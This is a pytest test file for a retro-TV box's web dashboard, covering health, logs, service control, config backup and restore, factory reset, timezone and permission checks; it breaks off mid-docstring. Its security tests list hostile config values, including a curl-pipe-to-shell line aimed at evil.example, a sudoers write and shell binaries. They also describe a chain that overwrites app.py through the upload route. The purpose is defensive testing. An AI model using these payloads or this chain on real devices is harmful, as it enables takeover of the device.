"""The System section: everything that was left as a reason to SSH in.

Health, logs, restarting things, checking the remote works, backing the config
up and putting it back, and the clock. Between them these are the last of the
routine reasons to open a terminal on one of these boxes.
"""

import threading
from pathlib import Path
from types import SimpleNamespace

import pytest

from retrobox import configwrite, servicectl, sysinfo
from retrobox.config import load_config
from tests.helpers import make_show

flask = pytest.importorskip("flask")
from retrobox.webui import create_app  # noqa: E402


@pytest.fixture
def runtime(monkeypatch, tmp_path):
    monkeypatch.setenv("RETROBOX_STATUS_PATH", str(tmp_path / "status.json"))
    monkeypatch.setenv("RETROBOX_CONTROL_SOCKET", str(tmp_path / "c.sock"))


@pytest.fixture
def box(tmp_path, runtime, monkeypatch):
    root = tmp_path / "media"
    root.mkdir()
    make_show(root, "sitcoms", 2)
    cfg = tmp_path / "config.yaml"
    cfg.write_text(
        f"# hand written\nmedia_root: {root}\n"
        f"channels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )
    # Nothing in these tests may shell out to the real machine.
    monkeypatch.setattr(sysinfo, "_run", lambda cmd, **k: "")
    monkeypatch.setattr(
        sysinfo.shutil, "disk_usage",
        lambda p: SimpleNamespace(total=500 * 1024**3, used=100 * 1024**3,
                                  free=400 * 1024**3),
    )
    monkeypatch.setattr(sysinfo.hwdetect, "build_report", lambda **k: (_ for _ in ()).throw(OSError()))
    app = create_app(str(cfg))
    app.config.update(TESTING=True)
    return app.test_client(), cfg, root


@pytest.fixture
def ran(monkeypatch):
    calls = []
    monkeypatch.setattr(servicectl, "_run", lambda cmd, **kw: (calls.append(cmd), (0, ""))[1])
    return calls


# ==========================================================================
# Health
# ==========================================================================
def test_the_system_page_answers_is_my_box_alright(box):
    client, _, root = box
    data = client.get("/api/system").get_json()
    assert data["version"]
    assert data["storage"]["root"]["state"] == "ok"
    assert data["storage"]["media"]["path"] == str(root)
    assert "decode" in data["hardware"]


def test_low_disk_space_is_flagged(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        sysinfo.shutil, "disk_usage",
        lambda p: SimpleNamespace(total=16 * 1024**3, used=16 * 1024**3, free=1024),
    )
    data = client.get("/api/system").get_json()
    assert data["storage"]["warning"] is True
    assert data["storage"]["root"]["state"] == "critical"


def test_every_missing_source_still_produces_a_page(box, monkeypatch, tmp_path):
    client, _, _ = box

    def refuse(*a, **k):
        raise OSError("nothing works here")

    monkeypatch.setattr(sysinfo.shutil, "disk_usage", refuse)
    monkeypatch.setattr(sysinfo.os, "getloadavg", refuse)
    monkeypatch.setattr(sysinfo, "THERMAL_ROOT", tmp_path / "nope")

    res = client.get("/api/system")
    assert res.status_code == 200
    data = res.get_json()
    assert data["temperature"] is None and data["load"] is None
    assert data["storage"]["root"] is None


def test_the_page_says_which_inputs_are_live(box, runtime):
    from retrobox import status as status_mod

    client, _, _ = box
    status_mod.write_status({
        "input": {"backends": ["keyboard", "web"], "recent": []},
    })
    assert client.get("/api/system").get_json()["input"]["backends"] == [
        "keyboard", "web",
    ]


def test_no_tv_running_does_not_break_the_page(box):
    client, _, _ = box
    data = client.get("/api/system").get_json()
    assert data["input"]["backends"] == []


# ==========================================================================
# Logs
# ==========================================================================
@pytest.fixture
def fake_journal(monkeypatch):
    import json as _json

    from retrobox import journal

    def runner(cmd, **kw):
        runner.calls.append(cmd)
        return runner.output

    runner.calls = []
    runner.output = _json.dumps({
        "__REALTIME_TIMESTAMP": "1700000000000000", "__CURSOR": "s=a;i=1",
        "PRIORITY": "6", "MESSAGE": "hello", "_SYSTEMD_UNIT": "retrobox.service",
    }) + "\n"
    monkeypatch.setattr(journal, "_run", runner)
    return runner


def test_logs_come_back_readable(box, fake_journal):
    client, _, _ = box
    data = client.get("/api/system/logs").get_json()
    assert data["entries"][0]["message"] == "hello"
    assert data["entries"][0]["level"] == "info"


def test_a_huge_request_is_capped(box, fake_journal):
    from retrobox import journal

    client, _, _ = box
    client.get("/api/system/logs?lines=999999")
    assert f"--lines={journal.MAX_LINES}" in fake_journal.calls[0]


def test_a_unit_that_is_not_ours_is_refused(box, fake_journal):
    client, _, _ = box
    assert client.get("/api/system/logs?unit=sshd.service").status_code == 400
    assert fake_journal.calls == [], "it asked journalctl anyway"


def test_a_bad_level_is_refused(box, fake_journal):
    client, _, _ = box
    assert client.get("/api/system/logs?level=shouty").status_code == 400


def test_logs_can_be_searched_and_paged(box, fake_journal):
    client, _, _ = box
    assert client.get("/api/system/logs?search=hello").get_json()["entries"]
    assert client.get("/api/system/logs?search=nothere").get_json()["entries"] == []
    client.get("/api/system/logs?after=s%3Da%3Bi%3D1")
    assert any("--after-cursor=" in a for a in fake_journal.calls[-1])


def test_the_support_bundle_is_one_block_of_text(box, fake_journal):
    client, _, _ = box
    res = client.get("/api/system/support")
    assert res.status_code == 200
    text = res.get_data(as_text=True)
    assert "RETRO BOX" in text and "hello" in text
    assert "Storage" in text


# ==========================================================================
# Service control
# ==========================================================================
@pytest.mark.parametrize(
    "action", ["restart-tv", "restart-dashboard", "reboot", "shutdown"]
)
def test_every_service_action_needs_confirming(box, ran, action):
    client, _, _ = box
    assert client.post(f"/api/system/service/{action}").status_code == 400
    assert ran == [], "it acted without being confirmed"

    assert client.post(f"/api/system/service/{action}?confirm=yes").status_code == 200
    assert len(ran) == 1


def test_an_action_that_is_not_on_the_list_is_refused(box, ran):
    client, _, _ = box
    res = client.post("/api/system/service/stop-the-firewall?confirm=yes")
    assert res.status_code in (400, 404)
    assert ran == []


def test_restarting_the_dashboard_warns_the_page_first(box, ran):
    client, _, _ = box
    body = client.post("/api/system/service/restart-dashboard?confirm=yes").get_json()
    assert "reconnect" in body["message"].lower()


def test_a_failed_command_is_reported_not_swallowed(box, monkeypatch):
    """It comes back as a failure, and it says what to do about it.

    This used to assert that sudo's own "a password is required" reached the
    browser. It did reach it, on a sold box, and it is the reason that box's
    owner could not act on what they were reading: they have no password to
    type, no keyboard to type it on and no idea what sudo is. So the check is
    now the same guarantee - the failure is reported rather than swallowed,
    with a 503 rather than a cheerful 200 - held to what a customer can use.
    """
    client, _, _ = box
    monkeypatch.setattr(
        servicectl, "_run", lambda cmd, **kw: (1, "sudo: a password is required")
    )
    res = client.post("/api/system/service/reboot?confirm=yes")
    assert res.status_code == 503
    said = res.get_json()["error"]
    assert "has not been given permission" in said
    assert "install-service.sh" in said, "it never says what would fix it"
    assert "sudo" not in said and "password" not in said


# ==========================================================================
# Config backup and restore
# ==========================================================================
def test_the_config_can_be_downloaded(box):
    client, cfg, _ = box
    res = client.get("/api/system/config")
    assert res.status_code == 200
    assert res.get_data(as_text=True) == cfg.read_text()
    assert "attachment" in res.headers.get("Content-Disposition", "")


def test_a_valid_config_can_be_restored(box, monkeypatch):
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    replacement = (
        f"media_root: {root}\nchannels:\n"
        f'  - number: 9\n    name: "Restored"\n    path: {root / "sitcoms"}\n'
    )
    res = client.post("/api/system/config?confirm=yes", data=replacement,
                      content_type="text/yaml")
    assert res.status_code == 200, res.get_json()
    assert [c.name for c in load_config(cfg).channels] == ["Restored"]


def test_replacing_the_whole_config_has_to_be_confirmed(box, monkeypatch):
    """The same guard the backup restore and the factory reset already have.

    This route throws away every setting on the box in one request, from a
    dashboard that has no password. Anything that destructive asks first.
    """
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    before = cfg.read_text()
    replacement = (
        f"media_root: {root}\nchannels:\n"
        f'  - number: 9\n    name: "Restored"\n    path: {root / "sitcoms"}\n'
    )
    res = client.post("/api/system/config", data=replacement,
                      content_type="text/yaml")
    assert res.status_code == 400
    assert cfg.read_text() == before, "the live config was replaced anyway"


@pytest.mark.parametrize(
    "bad",
    [
        "channels: [[[ not yaml",
        "",
        "just a string",
        "channels: []",
        "channels:\n  - number: 2\n    name: A\n    path: /does/not/exist\n",
        "channels:\n  - number: 2\n    name: A\n    path: /x\n  - number: 2\n    name: B\n    path: /x\n",
    ],
)
def test_a_config_that_would_not_boot_is_refused(box, bad):
    client, cfg, _ = box
    before = cfg.read_text()
    res = client.post("/api/system/config?confirm=yes", data=bad,
                      content_type="text/yaml")
    assert res.status_code == 400, bad
    assert cfg.read_text() == before, "the live config was replaced anyway"


def test_a_restored_config_whose_dayparts_point_nowhere_is_refused(box):
    """The same check the channel folders get, for the folders inside a schedule.

    A daypart that names a folder which is not on this box is a channel that
    goes silent at a particular hour of the evening and says nothing about why,
    which is the hardest kind of fault to report over the phone.
    """
    client, cfg, root = box
    before = cfg.read_text()
    bad = (
        f"media_root: {root}\nchannels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
        f"    dayparts:\n"
        f'      - from: "18:00"\n        to: "20:00"\n'
        f'        path: {root / "sitcmos"}\n'
    )

    res = client.post("/api/system/config?confirm=yes", data=bad,
                      content_type="text/yaml")
    assert res.status_code == 400, res.get_json()
    assert "sitcmos" in res.get_json()["error"]
    assert cfg.read_text() == before, "the live config was replaced anyway"


# --------------------------------------------------------------------------
# The power-off command, which is the one config value that becomes argv
# --------------------------------------------------------------------------
@pytest.mark.parametrize(
    "hostile",
    [
        '["/bin/sh", "-c", "curl http://evil.example/x | sh"]',
        '["sh", "-c", "id > /tmp/pwned"]',
        '["sudo", "tee", "/etc/sudoers.d/evil"]',
        '["sudo", "systemctl", "start", "evil.service"]',
        '["python3", "-c", "import os; os.system(\'id\')"]',
        '"/bin/sh -c whoami"',
        '["/home/pi/payload.sh"]',
    ],
)
def test_an_uploaded_config_cannot_turn_the_power_button_into_a_shell(box, hostile):
    """The hole this whole section exists for.

    ``power_off_command`` is handed to ``subprocess.Popen`` by the television
    the next time anyone shuts the box down - the dashboard's own button, the
    sleep timer, or volume-down past zero. This route has no password, so a
    config naming anything other than a shutdown is refused outright and the
    file on disk is left exactly where it was.
    """
    client, cfg, root = box
    before = cfg.read_text()
    document = (
        f"media_root: {root}\npower_off_command: {hostile}\nchannels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )

    res = client.post("/api/system/config?confirm=yes", data=document,
                      content_type="text/yaml")
    assert res.status_code == 400, res.get_json()
    assert "power_off_command" in res.get_json()["error"]
    assert cfg.read_text() == before, "the live config was replaced anyway"
    assert load_config(cfg).power_off_command == ("sudo", "poweroff")


@pytest.mark.parametrize(
    "allowed",
    ['["sudo", "poweroff"]', "[]", '"sudo poweroff"', '["sudo", "-n", "poweroff"]'],
)
def test_the_legitimate_power_off_commands_still_upload(box, monkeypatch, allowed):
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    document = (
        f"media_root: {root}\npower_off_command: {allowed}\nchannels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )
    res = client.post("/api/system/config?confirm=yes", data=document,
                      content_type="text/yaml")
    assert res.status_code == 200, res.get_json()


def test_the_backup_restore_will_not_put_a_hostile_power_off_command_back(
    box, monkeypatch
):
    """A backup is a file on the box, and files on the box can be written to.

    The upload route is not the only door: whatever wrote ``config.yaml.bak``
    is trusted no more than an upload is, so the same check runs here.
    """
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    client.patch("/api/channels/2", json={"name": "Changed"})  # makes the .bak
    backup = cfg.with_name(cfg.name + ".bak")
    assert backup.is_file()
    backup.write_text(
        f"media_root: {root}\n"
        f'power_off_command: ["/bin/sh", "-c", "id"]\nchannels:\n'
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n',
        encoding="utf-8",
    )

    res = client.post("/api/system/config/backup/restore?confirm=yes")
    assert res.status_code == 400, res.get_json()
    assert "power_off_command" in res.get_json()["error"]
    assert load_config(cfg).power_off_command == ("sudo", "poweroff")


def test_the_pre_automation_backup_is_offered(box, monkeypatch):
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    original = cfg.read_text()
    # Any dashboard edit creates config.yaml.bak the first time.
    client.patch("/api/channels/2", json={"name": "Changed"})

    info = client.get("/api/system/config/backup").get_json()
    assert info["exists"] is True
    assert info["bytes"] == len(original.encode())


def test_restoring_the_backup_puts_the_original_back(box, monkeypatch):
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    original = cfg.read_text()
    client.patch("/api/channels/2", json={"name": "Changed"})
    assert load_config(cfg).channels[0].name == "Changed"

    assert client.post("/api/system/config/backup/restore").status_code == 400
    res = client.post("/api/system/config/backup/restore?confirm=yes")
    assert res.status_code == 200, res.get_json()
    assert cfg.read_text() == original
    assert load_config(cfg).channels[0].name == "Sitcoms"


def test_there_is_no_backup_to_restore_before_anything_edited_it(box):
    client, _, _ = box
    assert client.get("/api/system/config/backup").get_json()["exists"] is False
    assert client.post("/api/system/config/backup/restore?confirm=yes").status_code == 404


# ==========================================================================
# Factory reset
# ==========================================================================
def test_factory_reset_asks_twice(box, monkeypatch):
    client, cfg, _ = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    before = cfg.read_text()

    assert client.post("/api/system/factory-reset").status_code == 400
    assert client.post("/api/system/factory-reset?confirm=yes").status_code == 400
    assert cfg.read_text() == before

    res = client.post("/api/system/factory-reset?confirm=yes", json={"understood": True})
    assert res.status_code == 200, res.get_json()


def test_factory_reset_does_not_touch_a_single_video_file(box, monkeypatch):
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    before = sorted(p.name for p in (root / "sitcoms").iterdir())
    assert before, "the fixture should have made episodes"

    client.post("/api/system/factory-reset?confirm=yes", json={"understood": True})

    assert (root / "sitcoms").is_dir(), "the library folder was deleted"
    assert sorted(p.name for p in (root / "sitcoms").iterdir()) == before


def test_factory_reset_leaves_a_config_the_box_can_still_boot(box, monkeypatch):
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    client.post("/api/system/factory-reset?confirm=yes", json={"understood": True})

    reloaded = load_config(cfg)
    assert reloaded.channels, "the box was left with no channels at all"
    assert reloaded.media_root == root


def test_factory_reset_says_plainly_that_media_is_kept(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    body = client.post(
        "/api/system/factory-reset?confirm=yes", json={"understood": True}
    ).get_json()
    assert "video" in body["message"].lower() or "media" in body["message"].lower()


@pytest.mark.parametrize("library", ["Films #2", "Films: the good ones"])
def test_factory_reset_keeps_a_library_folder_yaml_would_misread(
    tmp_path, runtime, monkeypatch, library
):
    """The folder name goes back into YAML as a value, not as raw text.

    Pasted straight in, ``media_root: /media/Films #2`` loads back as
    ``/media/Films`` - YAML reads the rest as a comment - and if that sibling
    folder happens to exist, a factory reset quietly rebuilds the whole lineup
    from somebody else's library and writes that into config.yaml. The decoy
    below is that sibling. A name with ": " in it is worse again: the document
    will not parse at all, and the customer is told their own factory reset
    "will not load".
    """
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    root = tmp_path / library
    root.mkdir()
    make_show(root, "sitcoms", 2)
    decoy = tmp_path / "Films"          # what a stripped comment would land on
    decoy.mkdir()
    make_show(decoy, "wrong library", 2)

    cfg = tmp_path / "config.yaml"
    cfg.write_text(f'media_root: "{root}"\n', encoding="utf-8")
    app = create_app(str(cfg))
    app.config.update(TESTING=True)
    client = app.test_client()

    res = client.post(
        "/api/system/factory-reset?confirm=yes", json={"understood": True}
    )
    assert res.status_code == 200, res.get_json()

    reloaded = load_config(cfg)
    assert reloaded.media_root == root, "the reset pointed the box at another folder"
    assert [c.name for c in reloaded.channels] == ["Sitcoms"]


# ==========================================================================
# Replacing the whole file while somebody else is editing it
# ==========================================================================
def _upload_a_config(client, cfg, root):
    return client.post(
        "/api/system/config?confirm=yes",
        data=f"media_root: {root}\nchannels:\n"
             f'  - number: 9\n    name: "Restored"\n    path: {root / "sitcoms"}\n',
        content_type="text/yaml",
    )


def _restore_the_backup(client, cfg, root):
    return client.post("/api/system/config/backup/restore?confirm=yes")


def _factory_reset(client, cfg, root):
    return client.post(
        "/api/system/factory-reset?confirm=yes", json={"understood": True}
    )


@pytest.mark.parametrize(
    "replace_the_whole_file",
    [_upload_a_config, _restore_the_backup, _factory_reset],
    ids=["an uploaded config", "the backup", "a factory reset"],
)
def test_no_edit_can_slip_in_while_the_whole_config_is_replaced(
    box, monkeypatch, replace_the_whole_file
):
    """The lost update the ConfigStore lock exists to prevent.

    Somebody restores config.yaml from a laptop while somebody else renames a
    channel from a phone. The rename reads the file, the restore lands, and the
    rename then writes its whole stale copy back over it - the restore is gone
    and both people were told "saved". Replacing the file has to take the same
    lock every edit takes, so an edit cannot even begin while one is landing.

    Held here at the moment of the write, an edit that gets in is an edit that
    read a config which is about to stop existing.
    """
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    # There has to be something to restore for the backup case.
    cfg.with_name(cfg.name + ".bak").write_text(cfg.read_text(), encoding="utf-8")

    at_the_write = threading.Event()
    let_it_finish = threading.Event()
    real_write = configwrite.atomic_write_bytes

    def paused_write(path, data):
        # Only the first write of config.yaml itself waits - the edit's own
        # write, if it manages one, must go straight through.
        if Path(path).name == cfg.name and not at_the_write.is_set():
            at_the_write.set()
            let_it_finish.wait(timeout=10)
        return real_write(path, data)

    monkeypatch.setattr(configwrite, "atomic_write_bytes", paused_write)

    replacing = threading.Thread(
        target=lambda: replace_the_whole_file(client, cfg, root)
    )
    replacing.start()
    assert at_the_write.wait(timeout=10), "it never got as far as writing the file"

    edited = threading.Event()
    editor = client.application.test_client()

    def rename():
        try:
            editor.patch("/api/channels/2", json={"name": "Renamed"})
        finally:
            edited.set()

    renaming = threading.Thread(target=rename)
    renaming.start()
    try:
        assert not edited.wait(timeout=0.5), (
            "an edit read and rewrote the config while it was being replaced"
        )
    finally:
        let_it_finish.set()
        renaming.join(timeout=10)
        replacing.join(timeout=10)

    assert not renaming.is_alive() and not replacing.is_alive()


# ==========================================================================
# The clock
# ==========================================================================
def test_the_clock_is_reported(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        sysinfo, "_run",
        lambda cmd, **k: "Timezone=Europe/London\nNTPSynchronized=yes\nNTP=yes\n"
        if "show" in cmd else "",
    )
    data = client.get("/api/system").get_json()["timezone"]
    assert data["timezone"] == "Europe/London"
    assert data["synchronised"] is True and data["warning"] is False


def test_an_unsynchronised_clock_warns_because_dayparting_drifts(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        sysinfo, "_run",
        lambda cmd, **k: "Timezone=UTC\nNTPSynchronized=no\nNTP=no\n"
        if "show" in cmd else "",
    )
    assert client.get("/api/system").get_json()["timezone"]["warning"] is True


def test_the_timezone_list_is_offered(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        sysinfo, "_run",
        lambda cmd, **k: "Europe/London\nUTC\n" if "list-timezones" in cmd else "",
    )
    assert client.get("/api/system/timezones").get_json()["timezones"] == [
        "Europe/London", "UTC",
    ]


def test_the_timezone_can_be_changed(box, monkeypatch, ran):
    client, _, _ = box
    monkeypatch.setattr(
        sysinfo, "_run",
        lambda cmd, **k: "Europe/London\nUTC\n" if "list-timezones" in cmd else "",
    )
    res = client.post("/api/system/timezone", json={"timezone": "UTC"})
    assert res.status_code == 200, res.get_json()
    assert ran == [["sudo", "-n", "timedatectl", "set-timezone", "UTC"]]


def test_a_timezone_the_box_does_not_have_is_refused(box, monkeypatch, ran):
    client, _, _ = box
    monkeypatch.setattr(
        sysinfo, "_run",
        lambda cmd, **k: "Europe/London\n" if "list-timezones" in cmd else "",
    )
    res = client.post("/api/system/timezone", json={"timezone": "Mars/Olympus"})
    assert res.status_code == 400
    assert ran == []


# ==========================================================================
# The rest of the class the power-off command belongs to
#
# Two kinds of config value can hurt somebody: one that becomes the argv of a
# subprocess, and one that becomes a folder this box reads, writes or deletes
# inside. This route replaces the whole document with no password, so it
# refuses to SAVE either kind rather than quietly correcting it.
# ==========================================================================
INSTALL_ROOT = Path(__file__).resolve().parent.parent


def _post_config(client, body):
    return client.post("/api/system/config?confirm=yes", data=body,
                       content_type="text/yaml")


def test_an_uploaded_config_cannot_point_the_library_at_the_source_tree(box):
    """Step one of the chain that ends with retrobox/app.py being replaced.

    With media_root here, every folder of the checkout becomes a channel, and
    a channel folder is where /api/uploads writes.
    """
    client, cfg, root = box
    before = cfg.read_text()
    res = _post_config(client, f"media_root: {INSTALL_ROOT}\n")
    assert res.status_code == 400, res.get_json()
    assert cfg.read_text() == before, "the live config was replaced anyway"


def test_an_uploaded_config_cannot_point_the_library_at_the_home_directory(box):
    client, cfg, root = box
    before = cfg.read_text()
    document = (
        f"media_root: {Path.home()}\nchannels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )
    assert _post_config(client, document).status_code == 400
    assert cfg.read_text() == before


def test_an_uploaded_config_cannot_make_python_files_a_kind_of_video(box):
    """The other half of the same chain.

    safe_media_name asks video_extensions what a video is, so one extra suffix
    on that list is an upload endpoint that writes that kind of file.
    """
    client, cfg, root = box
    before = cfg.read_text()
    document = (
        f'media_root: {root}\nvideo_extensions: [".py"]\nchannels:\n'
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )
    res = _post_config(client, document)
    assert res.status_code == 400, res.get_json()
    assert "video_extensions" in res.get_json()["error"]
    assert cfg.read_text() == before


def test_the_whole_upload_chain_is_refused_in_one_piece(box):
    """Both halves at once, exactly as an attacker would send them."""
    client, cfg, root = box
    before = cfg.read_text()
    document = (
        f'media_root: {Path.home()}\nvideo_extensions: [".py"]\n'
    )
    assert _post_config(client, document).status_code == 400
    assert cfg.read_text() == before


@pytest.mark.parametrize(
    "hostile",
    ['cec_binary: /bin/sh', 'cec_binary: python3', 'cec_binary: /home/pi/payload.sh',
     'cec_osd_name: "-o"'],
)
def test_an_uploaded_config_cannot_turn_the_tv_remote_into_a_shell(box, hostile):
    """input.cec_binary becomes argv[0] of a subprocess.Popen, like power_off."""
    client, cfg, root = box
    before = cfg.read_text()
    document = (
        f"media_root: {root}\ninput:\n  {hostile}\nchannels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )
    res = _post_config(client, document)
    assert res.status_code == 400, res.get_json()
    assert cfg.read_text() == before


def test_an_uploaded_config_cannot_deface_the_on_screen_display(box):
    client, cfg, root = box
    before = cfg.read_text()
    document = (
        f"media_root: {root}\nui:\n"
        f'  font: "VT323}}\\\\c&H0000FF&{{"\nchannels:\n'
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )
    assert _post_config(client, document).status_code == 400
    assert cfg.read_text() == before


def test_an_uploaded_config_cannot_aim_the_asset_writer_at_another_folder(box):
    """assets_dir is where /api/branding/splash and /api/filler/generate write."""
    client, cfg, root = box
    before = cfg.read_text()
    document = (
        f"media_root: {root}\nassets_dir: {Path.home()}\nchannels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )
    assert _post_config(client, document).status_code == 400
    assert cfg.read_text() == before


def test_the_ordinary_config_a_customer_would_send_still_saves(box, monkeypatch):
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    document = (
        f'media_root: {root}\nvideo_extensions: [".mp4", ".mkv", ".avi"]\n'
        f"ui:\n  font: \"DejaVu Sans Mono\"\n"
        f"input:\n  cec_binary: cec-client\n  cec_osd_name: Retro Box\n"
        f"channels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )
    res = _post_config(client, document)
    assert res.status_code == 200, res.get_json()


def test_the_backup_restore_will_not_put_a_hostile_media_root_back(box, monkeypatch):
    """The upload route is not the only door into config.yaml."""
    client, cfg, root = box
    monkeypatch.setattr("retrobox.webui.send_command", lambda c, **k: True)
    client.patch("/api/channels/2", json={"name": "Changed"})  # makes the .bak
    backup = cfg.with_name(cfg.name + ".bak")
    backup.write_text(
        f"media_root: {INSTALL_ROOT}\nchannels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n',
        encoding="utf-8",
    )

    res = client.post("/api/system/config/backup/restore?confirm=yes")
    assert res.status_code == 400, res.get_json()
    assert load_config(cfg).media_root == root


def test_a_hand_edited_config_still_cannot_hand_the_source_tree_to_the_uploader(
    tmp_path, runtime, monkeypatch
):
    """Nothing wrote this through the dashboard, so only the loader can stop it.

    A channel whose folder is the installed software is dropped when the file
    is read, so the channel the upload would have gone to is simply not there.
    """
    root = tmp_path / "media"
    make_show(root, "sitcoms", 1)
    cfg = tmp_path / "config.yaml"
    cfg.write_text(
        f"media_root: {root}\nchannels:\n"
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
        f'  - number: 3\n    name: "Source"\n    path: {INSTALL_ROOT / "retrobox"}\n'
    )
    monkeypatch.setattr(sysinfo, "_run", lambda cmd, **k: "")
    app = create_app(str(cfg))
    app.config.update(TESTING=True)
    client = app.test_client()

    assert [c["number"] for c in client.get("/api/channels").get_json()["channels"]] == [2]
    res = client.post("/api/uploads", json={
        "channel": 3,
        "files": [{"path": "x/retrobox/app.py", "size": 10, "action": "replace"}],
    })
    assert res.status_code == 404, res.get_json()


# ==========================================================================
# Permission: does this box still let its own dashboard do its job
#
# A box that was set up before this code grew a command has a sudoers file
# that grants an older, smaller list. It installs cleanly, boots cleanly and
# plays video cleanly, and then some of the buttons on this page come back
# with an error weeks later - on a television, to somebody who cannot SSH in.
# One real unit shipped that way. So the dashboard asks, says what is broken
# in words a customer can act on, and never repeats what sudo said.
# ==========================================================================
def a_check(state, **extra):
    """A stand-in for what servicectl.check_privileges found.

    Built from the real dataclass so a change to its shape breaks these tests
    rather than letting them pass against a field that no longer exists.
    """
    fields = {
        "headline": "This box's permission is out of date",
        "message": "so the Power buttons come back with an error",
        "affected": ("the Power buttons",),
        "refused": ("/usr/bin/systemctl reboot",),
        "detail": "1 of 21 commands refused; /etc/sudoers.d/retrobox-system is absent",
    }
    fields.update(extra)
    return servicectl.PrivilegeCheck(state=state, **fields)


@pytest.fixture
def not_a_service(monkeypatch):
    """The dashboard, built the way the test suite builds it: not by systemd."""
    monkeypatch.delenv("INVOCATION_ID", raising=False)
    return None


def test_the_system_page_says_which_actual_buttons_have_stopped_working(
    box, monkeypatch
):
    """"Some features are unavailable" is not something anybody can act on."""
    client, _, _ = box
    monkeypatch.setattr(
        servicectl, "check_privileges",
        lambda **kw: a_check(servicectl.PRIVILEGES_STALE),
    )
    body = client.get("/api/system/privileges").get_json()

    assert body["state"] == servicectl.PRIVILEGES_STALE
    assert body["needs_repair"] is True
    assert body["headline"] == "This box's permission is out of date"
    assert "the Power buttons" in body["affected"]
    named = " ".join(body["buttons"]).lower()
    for label in ("restart the tv", "reboot the box", "shut down"):
        assert label in named, f"the banner never names {label!r}: {body['buttons']}"


def test_a_box_that_never_had_the_permission_names_every_dead_button(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        servicectl, "check_privileges",
        lambda **kw: a_check(
            servicectl.PRIVILEGES_MISSING,
            affected=tuple(servicectl.GROUP_LABELS.values()),
        ),
    )
    body = client.get("/api/system/privileges").get_json()
    named = " ".join(body["buttons"]).lower()
    assert "restart the tv" in named
    assert "wifi" in named
    assert "wired settings" in named
    assert "timezone" in named


def test_nothing_sudo_said_ever_reaches_the_page(box, monkeypatch):
    """The whole reason the real unit's failure was incomprehensible."""
    client, _, _ = box
    monkeypatch.setattr(
        servicectl, "check_privileges",
        lambda **kw: a_check(
            servicectl.PRIVILEGES_STALE,
            refused=("/usr/bin/systemctl reboot", "/usr/bin/tee /etc/netplan/x.yaml"),
            detail="sudo: interactive authentication is required",
        ),
    )
    said = client.get("/api/system/privileges").get_data(as_text=True)
    for leak in ("sudo", "/etc/sudoers.d", "/usr/bin/systemctl", "/etc/netplan",
                 "authentication"):
        assert leak not in said, f"the page shows the customer {leak!r}: {said}"


def test_a_box_that_is_fine_is_told_nothing_at_all(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        servicectl, "check_privileges",
        lambda **kw: servicectl.PrivilegeCheck(
            state=servicectl.PRIVILEGES_OK,
            headline="This box can look after itself",
            message="The Power buttons, the clock and the Network page all have "
                    "the permission they need.",
        ),
    )
    body = client.get("/api/system/privileges").get_json()
    assert body["needs_repair"] is False
    assert body["repairable"] is False
    assert body["buttons"] == []


def test_asking_twice_in_a_row_does_not_ask_sudo_twice(box, monkeypatch):
    """21 short-lived processes, on a Pi that is playing video.

    This page has no login, so whatever triggers the check is triggerable by
    anyone on the network as fast as they can hold down F5.
    """
    client, _, _ = box
    asked = []
    monkeypatch.setattr(
        servicectl, "check_privileges",
        lambda **kw: (asked.append(1), a_check(servicectl.PRIVILEGES_STALE))[1],
    )
    for _ in range(5):
        assert client.get("/api/system/privileges").status_code == 200
    assert len(asked) == 1, f"sudo was asked {len(asked)} times for five presses"


def test_a_check_that_falls_over_does_not_take_the_system_page_with_it(
    box, monkeypatch
):
    client, _, _ = box

    def explodes(**kw):
        raise OSError("no sudo on this box")

    monkeypatch.setattr(servicectl, "check_privileges", explodes)
    res = client.get("/api/system/privileges")
    assert res.status_code == 200, res.get_data(as_text=True)
    body = res.get_json()
    assert body["needs_repair"] is False, "a check that failed is not a fault report"
    assert body["headline"] == ""


def test_the_repair_takes_nothing_whatsoever_from_the_request(box, monkeypatch):
    """It re-installs a rule that grants root. Nothing in a request may shape it.

    There is no login on this page, so a username, a path or a command list
